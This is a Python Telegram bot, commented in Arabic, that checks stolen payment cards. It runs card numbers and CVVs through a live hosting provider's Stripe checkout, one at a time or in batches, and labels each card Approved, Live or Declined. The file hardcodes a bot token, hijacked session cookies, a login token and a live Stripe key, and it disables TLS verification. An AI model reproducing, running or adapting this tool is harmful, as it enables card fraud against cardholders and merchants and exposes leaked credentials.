import requests
import re
import urllib3
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ضع توكن البوت هنا
BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
INVOICE_ID = "260528"

cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    '_ga': 'GA1.1.1641871625.1761294273',
    '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
    'inputNotes': '',
    'inputHowDidYouFind': '',
    'howDidRewards': '',
    'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
    'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
    'VsysFirstVisit': '1761307789',
    '_ga_248YG9EFT7': 'GS2.1.s1761307804$o4$g1$t1761310483$j59$l0$h2017258656',
}

def get_session_data():
    """جلب session_id و stripe cookies"""
    session = requests.Session()
    
    data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
    try:
        session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', 
                    data=data, cookies=cookies, verify=False, timeout=10)
    except:
        pass
    
    resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                       cookies=cookies, verify=False, timeout=10)
    
    m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
    if not m or '/pay/' not in m.group(0):
        return None, None, None
    
    session_id = m.group(0).split('/pay/')[1].split('#')[0]
    
    new_cookies = session.cookies.get_dict()
    stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
    stripe_sid = new_cookies.get('__stripe_sid', '')
    
    if not stripe_sid:
        time.sleep(2)
        resp2 = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                           cookies=cookies, verify=False, timeout=10)
        new_cookies2 = session.cookies.get_dict()
        stripe_sid = new_cookies2.get('__stripe_sid', '')
    
    return session_id, stripe_mid, stripe_sid

def check_card(card):
    """فحص البطاقة"""
    parts = card.strip().split('|')
    if len(parts) != 4:
        return "❌ صيغة خاطئة"
    
    cc, mm, yy, cvv = parts
    
    session_id, mid, sid = get_session_data()
    if not session_id:
        return "❌ فشل جلب session"
    
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    pm_data = (
        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
        'billing_details[name]=Card+details&billing_details[email]=test%40test.com&'
        f'billing_details[address][country]=EG&muid={mid}'
    )
    
    if sid:
        pm_data += f'&sid={sid}'
    
    pm_data += (
        '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
        f'client_attribution_metadata[checkout_session_id]={session_id}'
    )
    
    try:
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                          headers=headers, data=pm_data, timeout=15)
        pm_res = r1.json()
        
        if 'error' in pm_res:
            return f"❌ {pm_res['error'].get('message', 'خطأ')}"
        
        if 'id' not in pm_res:
            return "❌ فشل إنشاء PM"
        
        pm_id = pm_res['id']
        
        confirm_data = f'payment_method={pm_id}&expected_amount=6800'
        if mid:
            confirm_data += f'&muid={mid}'
        if sid:
            confirm_data += f'&sid={sid}'
        confirm_data += f'&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
        
        r2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                          headers=headers, data=confirm_data, timeout=15)
        
        confirm_res = r2.json()
        
        if 'payment_intent' not in confirm_res:
            return "⚠️ لا يوجد payment_intent"
        
        pi = confirm_res['payment_intent']
        status = pi.get('status')
        
        if status == 'succeeded':
            return "✅ Approved"
        
        if status == 'requires_action':
            na = pi.get('next_action', {})
            if na.get('type') == 'use_stripe_sdk':
                source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if source_id:
                    tds_data = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate',
                                      headers=headers, data=tds_data, timeout=15)
                    tds_res = r3.json()
                    
                    trans = tds_res.get('ares', {}).get('transStatus')
                    if not trans:
                        trans = tds_res.get('transStatus')
                    if not trans and 'state' in tds_res:
                        state = tds_res.get('state')
                        if state == 'succeeded':
                            return "✅ Approved (3DS)"
                        elif state == 'failed':
                            return "❌ Declined (3DS)"
                    
                    if trans == 'Y':
                        return "✅ Approved (3DS)"
                    elif trans == 'N':
                        return "✅ Live"
                    elif trans == 'C':
                        return "⚠️ Challenge Required"
                    elif trans == 'R':
                        return "❌ Rejected"
                    else:
                        return f"⚠️ 3DS Response: {str(tds_res)[:50]}"
        
        error = pi.get('last_payment_error', {})
        if error:
            return f"❌ {error.get('message', error.get('code', status))}"
        
        return f"❌ {status}"
        
    except Exception as e:
        return f"❌ {str(e)[:30]}"

# ============== Telegram Bot Handlers ==============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /start"""
    welcome_msg = """
🔰 *مرحباً بك في بوت فحص البطاقات* 🔰

📝 *كيفية الاستخدام:*
• أرسل البطاقة بالصيغة: `رقم|شهر|سنة|cvv`
• مثال: `5127000012349876|12|2025|123`

⚡ *الأوامر المتاحة:*
/check - فحص بطاقة واحدة
/mass - فحص عدة بطاقات (سطر لكل بطاقة)
/help - المساعدة

🚀 أرسل البطاقة الآن للفحص!
"""
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /help"""
    help_msg = """
📖 *دليل الاستخدام:*

1️⃣ *فحص بطاقة واحدة:*
   `/check 5127000012349876|12|2025|123`
   أو أرسل البطاقة مباشرة

2️⃣ *فحص عدة بطاقات:*
   `/mass`
   ثم أرسل البطاقات كل واحدة في سطر

📌 *صيغة البطاقة:*
   `رقم البطاقة|الشهر|السنة|CVV`
   
✅ *مثال صحيح:*
   `5127000012349876|12|2025|123`
   
❌ *أمثلة خاطئة:*
   `5127000012349876 12 2025 123` ← استخدم |
   `5127000012349876|12|25|123` ← السنة 4 أرقام
"""
    await update.message.reply_text(help_msg, parse_mode='Markdown')

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص بطاقة واحدة"""
    if not context.args:
        await update.message.reply_text("❌ أرسل البطاقة بالصيغة: /check رقم|شهر|سنة|cvv")
        return
    
    card = ' '.join(context.args)
    
    msg = await update.message.reply_text("⏳ جاري الفحص...")
    
    cc_num = card.split('|')[0]
    masked = f"{cc_num[:4]}****{cc_num[-4:]}"
    
    result = check_card(card)
    
    result_msg = f"🔍 *نتيجة الفحص:*\n\n💳 البطاقة: `{masked}`\n📊 النتيجة: {result}"
    
    await msg.edit_text(result_msg, parse_mode='Markdown')

async def mass_check_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بدء فحص عدة بطاقات"""
    context.user_data['mass_mode'] = True
    await update.message.reply_text(
        "📝 *وضع الفحص الجماعي*\n\n"
        "أرسل البطاقات الآن (كل بطاقة في سطر منفصل)\n"
        "عند الانتهاء أرسل: /done",
        parse_mode='Markdown'
    )
    context.user_data['cards'] = []

async def mass_check_done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إنهاء وفحص البطاقات"""
    if 'mass_mode' not in context.user_data:
        await update.message.reply_text("❌ استخدم /mass أولاً")
        return
    
    cards = context.user_data.get('cards', [])
    
    if not cards:
        await update.message.reply_text("❌ لم تقم بإرسال أي بطاقات!")
        context.user_data.clear()
        return
    
    await update.message.reply_text(f"⏳ جاري فحص {len(cards)} بطاقة...\n")
    
    results = []
    for i, card in enumerate(cards, 1):
        cc_num = card.split('|')[0] if '|' in card else card[:16]
        masked = f"{cc_num[:4]}****{cc_num[-4:]}"
        
        result = check_card(card)
        results.append(f"[{i}] `{masked}` → {result}")
        
        # إرسال النتائج كل 5 بطاقات
        if i % 5 == 0 or i == len(cards):
            batch_msg = "\n".join(results[-5:] if i % 5 == 0 else results[-(i % 5):])
            await update.message.reply_text(batch_msg, parse_mode='Markdown')
        
        if i < len(cards):
            time.sleep(3)
    
    # ملخص
    approved = sum(1 for r in results if '✅' in r)
    declined = sum(1 for r in results if '❌' in r)
    
    summary = f"\n\n📊 *الملخص:*\n✅ موافق: {approved}\n❌ مرفوض: {declined}\n📋 الإجمالي: {len(cards)}"
    await update.message.reply_text(summary, parse_mode='Markdown')
    
    context.user_data.clear()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الرسائل النصية"""
    text = update.message.text.strip()
    
    # إذا كان في وضع الفحص الجماعي
    if context.user_data.get('mass_mode'):
        if '|' in text:
            context.user_data['cards'].append(text)
            await update.message.reply_text(f"✅ تم إضافة البطاقة ({len(context.user_data['cards'])})")
        return
    
    # فحص عادي
    if '|' in text:
        msg = await update.message.reply_text("⏳ جاري الفحص...")
        
        cc_num = text.split('|')[0]
        masked = f"{cc_num[:4]}****{cc_num[-4:]}"
        
        result = check_card(text)
        
        result_msg = f"🔍 *نتيجة الفحص:*\n\n💳 البطاقة: `{masked}`\n📊 النتيجة: {result}"
        
        await msg.edit_text(result_msg, parse_mode='Markdown')
    else:
        await update.message.reply_text(
            "❌ صيغة خاطئة!\n\n"
            "استخدم: `رقم|شهر|سنة|cvv`\n"
            "أو اكتب /help للمساعدة",
            parse_mode='Markdown'
        )

def main():
    """تشغيل البوت"""
    print("🚀 جاري تشغيل البوت...")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # الأوامر
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("check", check_single))
    app.add_handler(CommandHandler("mass", mass_check_start))
    app.add_handler(CommandHandler("done", mass_check_done))
    
    # الرسائل
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ البوت يعمل الآن!")
    app.run_polling()

if __name__ == "__main__":
    main()
